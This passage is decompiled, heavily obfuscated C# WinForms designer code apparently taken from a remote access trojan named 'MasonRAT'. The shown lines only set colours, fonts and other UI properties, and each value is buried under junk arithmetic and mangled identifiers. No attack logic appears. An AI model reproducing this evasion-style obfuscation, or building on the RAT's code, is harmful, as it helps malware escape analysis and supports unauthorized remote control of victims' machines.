    this.\u2694️MasonRAT\u270Cۙ\u0608ة\u0608\u0608\u060Cﻋ\u0609ــ\u060A\u060Aڕ.TabIndex = ((13 ^ 2) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) ^ 0) + ((975409438 | 2111661663) - 261662778 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 << 0 >> (618990564 + (1127510360 | 12494634) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) << 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + (0 + 0);
    this.\u2694️MasonRAT\u270Cۙ\u0608ة\u0608\u0608\u060Cﻋ\u0609ــ\u060A\u060Aڕ.Text = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 244);
    this.\u2694️MasonRAT\u270Cــ\u060Cئ\u0608ﻋ\u060Aڙـىٺ\u060Dڙـ\u060A\u0609.Animated = true;
    this.\u2694️MasonRAT\u270Cــ\u060Cئ\u0608ﻋ\u060Aڙـىٺ\u060Dڙـ\u060A\u0609.BackColor = Color.Transparent;
    this.\u2694️MasonRAT\u270Cــ\u060Cئ\u0608ﻋ\u060Aڙـىٺ\u060Dڙـ\u060A\u0609.BorderColor = Color.Transparent;
    this.\u2694️MasonRAT\u270Cــ\u060Cئ\u0608ﻋ\u060Aڙـىٺ\u060Dڙـ\u060A\u0609.BorderRadius = -492603038 - ~1097077702 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) + 0 - (597822847 + 6651813 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) - 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 >> 1);
    this.\u2694️MasonRAT\u270Cــ\u060Cئ\u0608ﻋ\u060Aڙـىٺ\u060Dڙـ\u060A\u0609.ButtonMode = ButtonMode.RadioButton;
    this.\u2694️MasonRAT\u270Cــ\u060Cئ\u0608ﻋ\u060Aڙـىٺ\u060Dڙـ\u060A\u0609.CheckedState.FillColor = Color.FromArgb(((-546663266 ^ 1490333092 % 909096802) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) >> 0) + ((2122141126 ^ 12) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 + 0) % (-1093574966 - 1116057197 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 ^ 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 ^ 0), ((1514046929 >> 256176111) - 140976961 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) ^ 0) + (205137596 - 64206780 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 - 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + (0 + 0), (1457115824 - 775944259 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 ^ 0) - ((77399858 > 932775729 ? 908228545 : 681171409) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) ^ 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + -0);
    this.\u2694️MasonRAT\u270Cــ\u060Cئ\u0608ﻋ\u060Aڙـىٺ\u060Dڙـ\u060A\u0609.CheckedState.FillColor2 = Color.FromArgb((1299094746 % 1324058671 - 1155834187 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) + 0 > ((914397089 ^ 354364218 % 236792755) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 ^ 0) ? -1628004583 - ~1628004679 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) + 0 : 56 + (299129387 >> 444214424) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) ^ 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + (0 << 1), (-612137956 - ~122815825 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) >> 0) + (262559107 - -226763083 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) + 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << (0 >> 1), (~630430727 - 135171417 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) + 0 ^ ~((1355781632 ^ (893728188 | 1764334436)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) << 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> (0 >> 1));
    this.\u2694️MasonRAT\u270Cــ\u060Cئ\u0608ﻋ\u060Aڙـىٺ\u060Dڙـ\u060A\u0609.CheckedState.ForeColor = Color.White;
    this.\u2694️MasonRAT\u270Cــ\u060Cئ\u0608ﻋ\u060Aڙـىٺ\u060Dڙـ\u060A\u0609.Cursor = Cursors.Hand;
    this.\u2694️MasonRAT\u270Cــ\u060Cئ\u0608ﻋ\u060Aڙـىٺ\u060Dڙـ\u060A\u0609.DisabledState.BorderColor = Color.DarkGray;
    this.\u2694️MasonRAT\u270Cــ\u060Cئ\u0608ﻋ\u060Aڙـىٺ\u060Dڙـ\u060A\u0609.DisabledState.CustomBorderColor = Color.DarkGray;
    this.\u2694️MasonRAT\u270Cــ\u060Cئ\u0608ﻋ\u060Aڙـىٺ\u060Dڙـ\u060A\u0609.DisabledState.FillColor = Color.FromArgb((2054360949 > 1474918051 ? 697736053 : 930314737) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) + 0 - (1151104632 + (960399637 << 1151435746) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 - 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << (0 >> 1), (-1040146574 ^ 1317985126 << 1428326671) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 - 0 - ~(-1262908435 - 1684875959 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) - 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> -0, (1585113213 ^ 1710219654 % 1441442666) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) + 0 - (-1222063940 - 1755900676 % 1868445702 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) >> 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 ^ 0));
    this.\u2694️MasonRAT\u270Cــ\u060Cئ\u0608ﻋ\u060Aڙـىٺ\u060Dڙـ\u060A\u0609.DisabledState.FillColor2 = Color.FromArgb((341767537 - 1673876347 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) << 0 ^ -(-1945676000 - 1017182335 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 - 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> -0, (~1109934644 - 1527596982 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) >> 0 ^ (1071540776 + (581029008 << 675797088) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) ^ 0 | 1615478835 + (716970333 >> 497914845) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) + 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> (0 >> 1), ((1116633537 > 535534208 ? 441210246 : 588280328) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) ^ 0) - ((-2081616425 ^ ~1717479157) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) ^ 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ 0 << 1);
    this.\u2694️MasonRAT\u270Cــ\u060Cئ\u0608ﻋ\u060Aڙـىٺ\u060Dڙـ\u060A\u0609.DisabledState.ForeColor = Color.FromArgb((1793300455 % 854779808 - 1638329519 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) >> 0 ^ ~((-592894838 ^ 2123178444 << 1201489565) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) - 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 ^ 0), 482657511 + ~2144584792 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) - 0 + (-1739429303 - (1787778868 >> 1120174529) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) - 0 | (570744139 ^ 17) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) - 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ 0 + 0, -1706609762 - 373747647 % 1441954093 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) + 0 + (1415331970 - (1429745576 >> 1644355745) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 + 0 | (899007129 > 366187510 ? 1392481294 : 1856641725) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) + 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> 0 + 0);
    this.\u2694️MasonRAT\u270Cــ\u060Cئ\u0608ﻋ\u060Aڙـىٺ\u060Dڙـ\u060A\u0609.FillColor = Color.FromArgb(((-1426719383 ^ 7) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 ^ 0) + ((1426719396 ^ 9) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) >> 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - -0, ((-1785691294 ^ 2112684397 >> 48288715) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) >> 0) + (~1465484827 - 1044756620 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 >> 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + (0 ^ 0), (1250397395 > 1964941847 ? 715827938 : 536870954 /*0x2000002A*/) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) + 0 + (-918479865 - ~990182598 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) - 0 << 760030054 - 257105706 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 - 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + (0 >> 1));
    this.\u2694️MasonRAT\u270Cــ\u060Cئ\u0608ﻋ\u060Aڙـىٺ\u060Dڙـ\u060A\u0609.FillColor2 = Color.FromArgb((1834458301 + -1834458247 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) >> 0 ^ (22 ^ 16 /*0x10*/) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) >> 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 + 0), 2118873939 + 1491415713 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) - 0 - ~((684677684 ^ 2) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 << 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> (0 << 1), ((1157280889 ^ 13) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 - 0 > -2116659491 - (1776940169 << 487532727) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) >> 0 ? (81430121 > 1471753995 ? 104 : 78) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) + 0 : 410321000 - (1904881898 << 1995811247) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) + 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 + 0));
    this.\u2694️MasonRAT\u270Cــ\u060Cئ\u0608ﻋ\u060Aڙـىٺ\u060Dڙـ\u060A\u0609.FocusedColor = Color.Transparent;
    this.\u2694️MasonRAT\u270Cــ\u060Cئ\u0608ﻋ\u060Aڙـىٺ\u060Dڙـ\u060A\u0609.Font = new Font(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 245), 15.75f, FontStyle.Bold);
    this.\u2694️MasonRAT\u270Cــ\u060Cئ\u0608ﻋ\u060Aڙـىٺ\u060Dڙـ\u060A\u0609.ForeColor = Color.White;
    this.\u2694️MasonRAT\u270Cــ\u060Cئ\u0608ﻋ\u060Aڙـىٺ\u060Dڙـ\u060A\u0609.HoverState.FillColor = Color.FromArgb(((-1354063324 ^ ~1555873344) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 - 0 ^ ((1643340608 > 212069987 ? 201974656 : 269299541) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) ^ 0) << 1820437201 - 1975472027 % 1687019626 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) + 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + (0 >> 1), ((236630926 ^ 2042034516 >> 1559517611) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) + 0 > (1978030367 - 1759097888 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 ^ 0) ? 872655249 % 1662411157 - 872655223 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) ^ 0 : -39654638 - ~39654671 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 - 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> 0 + 0, ((60 ^ 17) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) ^ 0 ^ (2008284906 ^ (1997777925 | 598995689)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) ^ 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ 0 >> 1);
    this.\u2694️MasonRAT\u270Cــ\u060Cئ\u0608ﻋ\u060Aڙـىٺ\u060Dڙـ\u060A\u0609.HoverState.FillColor2 = Color.FromArgb(((20316455 ^ ~1442895516) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) ^ 0 ^ -((701019231 ^ (1818116562 | 1991254657)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) ^ 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + -0, ((1354904127 ^ 20) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 